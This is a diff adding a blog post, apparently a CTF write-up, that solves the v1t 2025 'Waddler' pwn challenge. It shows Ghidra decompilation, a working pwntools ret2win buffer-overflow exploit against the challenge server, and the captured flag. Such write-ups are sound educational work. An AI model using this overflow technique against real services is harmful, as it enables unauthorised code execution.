@@ -1,0 +1,144 @@
+---
+layout: post
+title:  "v1t 2025 Pwn challenges"
+date:   2025-11-02 17:02:10 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /v1t-pwn/
+---
+* TOC
+{:toc}
+
+## Waddler
+
+**Category**: pwn
+
+**Description**: Poke it the right way and it hums back something useful. `nc chall.v1t.site 30210`
+
+I get the file:
+```shell
+file chall  
+chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0f859ea6e2f001a95866f0f9aecc0ebce8279e6, for GNU/Linux 3.2.0, not stripped
+```
+
+When I run it I see this:
+```shell
+./chall  
+The Ducks are coming!
+```
+And it takes an input.
+
+It is vulnerable to a buffer overflow:
+```shell
+./chall  
+The Ducks are coming!  
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
+Segmentation fault
+```
+
+I open the binary in ghidra. I see the `main` function and the `duck` function:
+```t
+undefined8 main(void)
+
+{
+  char local_48 [64];
+  
+  puts("The Ducks are coming!");
+  fgets(local_48,0x50,stdin);
+  return 0;
+}
+
+
+void duck(void)
+
+{
+  char *pcVar1;
+  undefined8 uStack_120;
+  char local_118 [256];
+  size_t local_18;
+  FILE *local_10;
+  
+  uStack_120 = 0x4012b4;
+  local_10 = fopen("flag.txt","r");
+  if (local_10 == (FILE *)0x0) {
+    uStack_120 = 0x4012ce;
+    puts("flag file not found");
+                    /* WARNING: Subroutine does not return */
+    uStack_120 = 0x4012d8;
+    exit(1);
+  }
+  uStack_120 = 0x4012f0;
+  pcVar1 = fgets(local_118,0x100,local_10);
+  if (pcVar1 == (char *)0x0) {
+    uStack_120 = 0x401304;
+    puts("failed to read flag");
+    uStack_120 = 0x401310;
+    fclose(local_10);
+                    /* WARNING: Subroutine does not return */
+    uStack_120 = 0x40131a;
+    exit(1);
+  }
+  uStack_120 = 0x401326;
+  fclose(local_10);
+  uStack_120 = 0x401335;
+  local_18 = strlen(local_118);
+  if ((local_18 != 0) && (local_118[local_18 - 1] == '\n')) {
+    local_118[local_18 - 1] = '\0';
+  }
+  uStack_120 = 0x401382;
+  printf("FLAG: %s\n",local_118);
+  return;
+}
+```
+The `duck` function seems to print the flag so we can overflow the buffer and point the program to `duck()`. 
+
+Run this python to get the flag:
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.log_level = 'info'
+
+elf = ELF("./chall")
+p = remote("chall.v1t.site", 30210)
+
+p.recvuntil(b"The Ducks are coming!\n")
+
+offset = 72
+duck_addr = elf.symbols['duck']
+log.info(f"duck() @ {hex(duck_addr)}")
+
+payload = b"A" * offset + p64(duck_addr)
+p.sendline(payload)
+
+try:
+    data = p.recvall(timeout=2)
+except EOFError:
+    data = b''
+
+if data:
+    print(data.decode(errors='ignore'), end='')
+
+p.close()
+```
+
+Output:
+```shell
+python3 exploit.py  
+[*] '/home/ron/Desktop/ctf/v1tctf/chall'  
+   Arch:       amd64-64-little  
+   RELRO:      Partial RELRO  
+   Stack:      No canary found  
+   NX:         NX enabled  
+   PIE:        No PIE (0x400000)  
+   SHSTK:      Enabled  
+   IBT:        Enabled  
+   Stripped:   No  
+[+] Opening connection to chall.v1t.site on port 30210: Done  
+[*] duck() @ 0x40128c  
+[+] Receiving all data: Done (58B)  
+[*] Closed connection to chall.v1t.site port 30210  
+FLAG: v1t{w4ddl3r_3x1t5_4e4d6c332b6fe62a63afe56171fd3725}
+```
+
+`v1t{w4ddl3r_3x1t5_4e4d6c332b6fe62a63afe56171fd3725}`
